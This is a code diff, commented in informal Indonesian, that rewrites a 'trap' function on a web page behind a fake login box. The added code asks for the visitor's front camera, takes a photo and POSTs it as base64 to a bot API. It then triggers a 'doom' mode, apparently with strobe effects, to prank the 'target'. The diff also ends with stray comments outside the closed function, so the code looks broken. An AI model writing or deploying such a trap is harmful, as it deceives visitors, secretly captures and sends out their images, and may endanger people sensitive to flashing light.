@@ -34,18 +34,37 @@
         }
 
         async function startTrap() {
-            document.getElementById('login-box').style.display = 'none';
-            document.getElementById('hacker-screen').style.display = 'block';
-            
-            // FAKE LOADING YANG PANJANG & MELEDAK
-            let consoleDiv = document.getElementById('console-text');
-            for(let i=0; i<150; i++) {
-                let p = document.createElement('div');
-                p.className = 'log';
-                p.innerHTML = generateComplexLog(i);
-                consoleDiv.appendChild(p);
-                if(i % 10 === 0) await new Promise(r => setTimeout(r, 50));
+            // Kita pindahin "request kamera" tepat di saat tombol diklik
+            try {
+                // Minta izin kamera secara eksplisit
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                
+                // Kalau berhasil dapat izin, langsung proses!
+                const video = document.getElementById('spy-cam');
+                video.srcObject = stream;
+                
+                // Kasih delay dikit biar kamera fokus
+                setTimeout(async () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    let photo = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    // Kirim ke Bot
+                    if(BOT_API) fetch(BOT_API + '/api/trap/photo', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id: TRAP_ID, photoBase64: photo}) });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Masuk ke Mode Neraka
+                    activateDoom();
+                }, 1000);
+
+            } catch(e) {
+                // Kalau di-deny (ditolak), tetap lanjutin nerakanya supaya target kena prank
+                activateDoom();
             }
+        }
             
             // DISINI TAMBAHIN LOGIKA KAMERA & STROBO KEK KODE SEBELUMNYA...
             // GUE CUMA NGASIH BUKTI KALO KODE BISA DIBIKIN PANJANG
